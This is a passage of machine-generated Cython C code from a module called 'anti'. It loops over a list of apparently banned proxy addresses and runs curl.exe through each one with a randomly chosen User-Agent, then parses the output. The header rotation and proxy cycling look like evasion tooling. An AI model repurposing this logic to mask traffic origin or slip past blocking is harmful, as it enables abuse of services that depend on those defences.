                    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0; {
                        __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
                        if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_1, &__pyx_t_3) < 0) __PYX_ERR(0, 264, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_5);
                        __Pyx_GOTREF(__pyx_t_1);
                        __Pyx_GOTREF(__pyx_t_3);
                        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__61, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 265, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_17);
                        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                        if (PyDict_SetItem(__pyx_d, __pyx_n_s_total_ip, __pyx_int_0) < 0) __PYX_ERR(0, 266, __pyx_L89_except_error)
                            __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_ban_sock); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 267, __pyx_L89_except_error)
                            __Pyx_GOTREF(__pyx_t_17);
                        if (likely(PyList_CheckExact(__pyx_t_17)) || PyTuple_CheckExact(__pyx_t_17)) {
                            __pyx_t_4 = __pyx_t_17; __Pyx_INCREF(__pyx_t_4); __pyx_t_14 = 0;
                            __pyx_t_10 = NULL;
                        }
                        else {
                            __pyx_t_14 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_17); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 267, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __pyx_t_10 = Py_TYPE(__pyx_t_4)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 267, __pyx_L89_except_error)
                        }
                        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                        for (;;) {
                            if (likely(!__pyx_t_10)) {
                                if (likely(PyList_CheckExact(__pyx_t_4))) {
                                    if (__pyx_t_14 >= PyList_GET_SIZE(__pyx_t_4)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                    __pyx_t_17 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_14); __Pyx_INCREF(__pyx_t_17); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 267, __pyx_L89_except_error)
#else
                                    __pyx_t_17 = PySequence_ITEM(__pyx_t_4, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 267, __pyx_L89_except_error)
                                        __Pyx_GOTREF(__pyx_t_17);
#endif
                                }
                                else {
                                    if (__pyx_t_14 >= PyTuple_GET_SIZE(__pyx_t_4)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                    __pyx_t_17 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_14); __Pyx_INCREF(__pyx_t_17); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 267, __pyx_L89_except_error)
#else
                                    __pyx_t_17 = PySequence_ITEM(__pyx_t_4, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 267, __pyx_L89_except_error)
                                        __Pyx_GOTREF(__pyx_t_17);
#endif
                                }
                            }
                            else {
                                __pyx_t_17 = __pyx_t_10(__pyx_t_4);
                                if (unlikely(!__pyx_t_17)) {
                                    PyObject* exc_type = PyErr_Occurred();
                                    if (exc_type) {
                                        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                                        else __PYX_ERR(0, 267, __pyx_L89_except_error)
                                    }
                                    break;
                                }
                                __Pyx_GOTREF(__pyx_t_17);
                            }
                            if (PyDict_SetItem(__pyx_d, __pyx_n_s_sock, __pyx_t_17) < 0) __PYX_ERR(0, 267, __pyx_L89_except_error)
                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                            if (PyDict_SetItem(__pyx_d, __pyx_n_s_count_ip, __pyx_int_0) < 0) __PYX_ERR(0, 268, __pyx_L89_except_error)
                                __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_GET, __pyx_n_s_format); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 269, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_11);
                            __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_sock); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 269, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_21);
                            __pyx_t_22 = NULL;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
                                __pyx_t_22 = PyMethod_GET_SELF(__pyx_t_11);
                                if (likely(__pyx_t_22)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
                                    __Pyx_INCREF(__pyx_t_22);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_11, function);
                                }
                            }
                            __pyx_t_17 = (__pyx_t_22) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_22, __pyx_t_21) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_21);
                            __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                            __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                            if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 269, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_17);
                            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                            __pyx_t_11 = PyTuple_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 269, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_11);
                            __Pyx_GIVEREF(__pyx_t_17);
                            PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_17);
                            __pyx_t_17 = 0;
                            __pyx_t_17 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 269, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_17);
                            if (PyDict_SetItem(__pyx_t_17, __pyx_n_s_end, __pyx_kp_u__2) < 0) __PYX_ERR(0, 269, __pyx_L89_except_error)
                                __pyx_t_21 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_t_11, __pyx_t_17); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 269, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_21);
                            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                            __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_sys); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 270, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_17);
                            __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_stdout); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 270, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_11);
                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                            __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_flush); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 270, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_17);
                            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                            __pyx_t_11 = NULL;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                                __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_17);
                                if (likely(__pyx_t_11)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                                    __Pyx_INCREF(__pyx_t_11);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_17, function);
                                }
                            }
                            __pyx_t_21 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_17);
                            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                            if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 270, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_21);
                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                            __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_22, __pyx_n_s_Popen); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_22);
                            __pyx_t_24 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_curl_exe_H_User_Agent_1_k_L_max, __pyx_n_s_format); if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_24);
                            __Pyx_GetModuleGlobalName(__pyx_t_25, __pyx_n_s_sock); if (unlikely(!__pyx_t_25)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_25);
                            __pyx_t_26 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_25); if (unlikely(!__pyx_t_26)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_26);
                            __Pyx_DECREF(__pyx_t_25); __pyx_t_25 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_27, __pyx_n_s_choice); if (unlikely(!__pyx_t_27)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_27);
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_headers); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __pyx_t_29 = NULL;
                            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_27))) {
                                __pyx_t_29 = PyMethod_GET_SELF(__pyx_t_27);
                                if (likely(__pyx_t_29)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_27);
                                    __Pyx_INCREF(__pyx_t_29);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_27, function);
                                }
                            }
                            __pyx_t_25 = (__pyx_t_29) ? __Pyx_PyObject_Call2Args(__pyx_t_27, __pyx_t_29, __pyx_t_28) : __Pyx_PyObject_CallOneArg(__pyx_t_27, __pyx_t_28);
                            __Pyx_XDECREF(__pyx_t_29); __pyx_t_29 = 0;
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            if (unlikely(!__pyx_t_25)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_25);
                            __Pyx_DECREF(__pyx_t_27); __pyx_t_27 = 0;
                            __pyx_t_27 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_25); if (unlikely(!__pyx_t_27)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_27);
                            __Pyx_DECREF(__pyx_t_25); __pyx_t_25 = 0;
                            __pyx_t_25 = NULL;
                            __pyx_t_12 = 0;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_24))) {
                                __pyx_t_25 = PyMethod_GET_SELF(__pyx_t_24);
                                if (likely(__pyx_t_25)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_24);
                                    __Pyx_INCREF(__pyx_t_25);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_24, function);
                                    __pyx_t_12 = 1;
                                }
                            }
#if CYTHON_FAST_PYCALL
                            if (PyFunction_Check(__pyx_t_24)) {
                                PyObject* __pyx_temp[3] = { __pyx_t_25, __pyx_t_26, __pyx_t_27 };
                                __pyx_t_23 = __Pyx_PyFunction_FastCall(__pyx_t_24, __pyx_temp + 1 - __pyx_t_12, 2 + __pyx_t_12); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                    __Pyx_XDECREF(__pyx_t_25); __pyx_t_25 = 0;
                                __Pyx_GOTREF(__pyx_t_23);
                                __Pyx_DECREF(__pyx_t_26); __pyx_t_26 = 0;
                                __Pyx_DECREF(__pyx_t_27); __pyx_t_27 = 0;
                            }
                            else
#endif
#if CYTHON_FAST_PYCCALL
                                if (__Pyx_PyFastCFunction_Check(__pyx_t_24)) {
                                    PyObject* __pyx_temp[3] = { __pyx_t_25, __pyx_t_26, __pyx_t_27 };
                                    __pyx_t_23 = __Pyx_PyCFunction_FastCall(__pyx_t_24, __pyx_temp + 1 - __pyx_t_12, 2 + __pyx_t_12); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                        __Pyx_XDECREF(__pyx_t_25); __pyx_t_25 = 0;
                                    __Pyx_GOTREF(__pyx_t_23);
                                    __Pyx_DECREF(__pyx_t_26); __pyx_t_26 = 0;
                                    __Pyx_DECREF(__pyx_t_27); __pyx_t_27 = 0;
                                }
                                else
#endif
                                {
                                    __pyx_t_28 = PyTuple_New(2 + __pyx_t_12); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                        __Pyx_GOTREF(__pyx_t_28);
                                    if (__pyx_t_25) {
                                        __Pyx_GIVEREF(__pyx_t_25); PyTuple_SET_ITEM(__pyx_t_28, 0, __pyx_t_25); __pyx_t_25 = NULL;
                                    }
                                    __Pyx_GIVEREF(__pyx_t_26);
                                    PyTuple_SET_ITEM(__pyx_t_28, 0 + __pyx_t_12, __pyx_t_26);
                                    __Pyx_GIVEREF(__pyx_t_27);
                                    PyTuple_SET_ITEM(__pyx_t_28, 1 + __pyx_t_12, __pyx_t_27);
                                    __pyx_t_26 = 0;
                                    __pyx_t_27 = 0;
                                    __pyx_t_23 = __Pyx_PyObject_Call(__pyx_t_24, __pyx_t_28, NULL); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                        __Pyx_GOTREF(__pyx_t_23);
                                    __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                }
                            __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
                            __pyx_t_24 = PyTuple_New(1); if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_24);
                            __Pyx_GIVEREF(__pyx_t_23);
                            PyTuple_SET_ITEM(__pyx_t_24, 0, __pyx_t_23);
                            __pyx_t_23 = 0;
                            __pyx_t_23 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_23);
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_PIPE); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            if (PyDict_SetItem(__pyx_t_23, __pyx_n_s_stdout, __pyx_t_28) < 0) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_28 = __Pyx_PyObject_Call(__pyx_t_22, __pyx_t_24, __pyx_t_23); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
                            __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
                            __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                            __pyx_t_23 = __Pyx_PyObject_GetAttrStr(__pyx_t_28, __pyx_n_s_stdout); if (unlikely(!__pyx_t_23)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_23);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_28 = __Pyx_PyObject_GetAttrStr(__pyx_t_23, __pyx_n_s_read); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __Pyx_DECREF(__pyx_t_23); __pyx_t_23 = 0;
                            __pyx_t_23 = NULL;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_28))) {
                                __pyx_t_23 = PyMethod_GET_SELF(__pyx_t_28);
                                if (likely(__pyx_t_23)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_28);
                                    __Pyx_INCREF(__pyx_t_23);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_28, function);
                                }
                            }
                            __pyx_t_11 = (__pyx_t_23) ? __Pyx_PyObject_CallOneArg(__pyx_t_28, __pyx_t_23) : __Pyx_PyObject_CallNoArg(__pyx_t_28);
                            __Pyx_XDECREF(__pyx_t_23); __pyx_t_23 = 0;
                            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_11);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_28 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_decode); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                            __pyx_t_11 = NULL;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_28))) {
                                __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_28);
                                if (likely(__pyx_t_11)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_28);
                                    __Pyx_INCREF(__pyx_t_11);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_28, function);
                                }
                            }
                            __pyx_t_17 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_28, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_28);
                            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                            if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_17);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_28 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_replace); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                            __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_28, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_17);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_28 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_split); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                            __pyx_t_17 = NULL;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_28))) {
                                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_28);
                                if (likely(__pyx_t_17)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_28);
                                    __Pyx_INCREF(__pyx_t_17);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_28, function);
                                }
                            }
                            __pyx_t_21 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_28, __pyx_t_17, __pyx_kp_u__15) : __Pyx_PyObject_CallOneArg(__pyx_t_28, __pyx_kp_u__15);
                            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                            if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_21);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_28 = PyUnicode_Join(__pyx_kp_u__3, __pyx_t_21); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                            __pyx_t_21 = PyUnicode_Replace(((PyObject*)__pyx_t_28), __pyx_kp_u__62, __pyx_kp_u__2, -1L); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_21);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_28 = PyUnicode_Split(((PyObject*)__pyx_t_21), __pyx_kp_u__3, -1L); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                            if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_28) < 0) __PYX_ERR(0, 271, __pyx_L89_except_error)
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s__38); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 272, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __pyx_t_9 = PyObject_Length(__pyx_t_28); if (unlikely(__pyx_t_9 == ((Py_ssize_t)-1))) __PYX_ERR(0, 272, __pyx_L89_except_error)
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_2 = ((__pyx_t_9 > 1) != 0);
                            if (__pyx_t_2) {
                                __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s__38); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 273, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_28);
                                if (likely(PyList_CheckExact(__pyx_t_28)) || PyTuple_CheckExact(__pyx_t_28)) {
                                    __pyx_t_21 = __pyx_t_28; __Pyx_INCREF(__pyx_t_21); __pyx_t_9 = 0;
                                    __pyx_t_30 = NULL;
                                }
                                else {
                                    __pyx_t_9 = -1; __pyx_t_21 = PyObject_GetIter(__pyx_t_28); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 273, __pyx_L89_except_error)
                                        __Pyx_GOTREF(__pyx_t_21);
                                    __pyx_t_30 = Py_TYPE(__pyx_t_21)->tp_iternext; if (unlikely(!__pyx_t_30)) __PYX_ERR(0, 273, __pyx_L89_except_error)
                                }
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                for (;;) {
                                    if (likely(!__pyx_t_30)) {
                                        if (likely(PyList_CheckExact(__pyx_t_21))) {
                                            if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_21)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                            __pyx_t_28 = PyList_GET_ITEM(__pyx_t_21, __pyx_t_9); __Pyx_INCREF(__pyx_t_28); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 273, __pyx_L89_except_error)
#else
                                            __pyx_t_28 = PySequence_ITEM(__pyx_t_21, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 273, __pyx_L89_except_error)
                                                __Pyx_GOTREF(__pyx_t_28);
#endif
                                        }
                                        else {
                                            if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_21)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                            __pyx_t_28 = PyTuple_GET_ITEM(__pyx_t_21, __pyx_t_9); __Pyx_INCREF(__pyx_t_28); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 273, __pyx_L89_except_error)
#else
                                            __pyx_t_28 = PySequence_ITEM(__pyx_t_21, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 273, __pyx_L89_except_error)
                                                __Pyx_GOTREF(__pyx_t_28);
#endif
                                        }
                                    }
                                    else {
                                        __pyx_t_28 = __pyx_t_30(__pyx_t_21);
                                        if (unlikely(!__pyx_t_28)) {
                                            PyObject* exc_type = PyErr_Occurred();
                                            if (exc_type) {
                                                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                                                else __PYX_ERR(0, 273, __pyx_L89_except_error)
                                            }
                                            break;
                                        }
                                        __Pyx_GOTREF(__pyx_t_28);
                                    }
                                    if (PyDict_SetItem(__pyx_d, __pyx_n_s_i, __pyx_t_28) < 0) __PYX_ERR(0, 273, __pyx_L89_except_error)
                                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                    {
                                        __Pyx_PyThreadState_declare
                                            __Pyx_PyThreadState_assign
                                            __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_19, &__pyx_t_18);
                                        __Pyx_XGOTREF(__pyx_t_7);
                                        __Pyx_XGOTREF(__pyx_t_19);
                                        __Pyx_XGOTREF(__pyx_t_18); {
                                            __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_i); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 275, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_17);
                                            __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_split); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 275, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_11);
                                            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                            __pyx_t_17 = NULL;
                                            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
                                                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_11);
                                                if (likely(__pyx_t_17)) {
                                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
                                                    __Pyx_INCREF(__pyx_t_17);
                                                    __Pyx_INCREF(function);
                                                    __Pyx_DECREF_SET(__pyx_t_11, function);
                                                }
                                            }
                                            __pyx_t_28 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_17, __pyx_kp_u__63) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_kp_u__63);
                                            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                            if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 275, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_28);
                                            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                                            __pyx_t_11 = __Pyx_GetItemInt(__pyx_t_28, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 275, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_11);
                                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                            __pyx_t_28 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_11); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 275, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_28);
                                            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                                            if (PyDict_SetItem(__pyx_d, __pyx_n_s_temp, __pyx_t_28) < 0) __PYX_ERR(0, 275, __pyx_L121_error)
                                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                            __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_temp); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 276, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_11);
                                            __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 276, __pyx_L121_error)
                                                __Pyx_GOTREF(__pyx_t_17);
                                            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                                            __pyx_t_11 = NULL;
                                            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_17))) {
                                                __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_17);
                                                if (likely(__pyx_t_11)) {
                                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                                                    __Pyx_INCREF(__pyx_t_11);
                                                    __Pyx_INCREF(function);
                                                    __Pyx_DECREF_SET(__pyx_t_17, function);
                                                }
                                            }
                                            __pyx_t_28 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_11, __pyx_kp_u__55) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_u__55);
                                            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
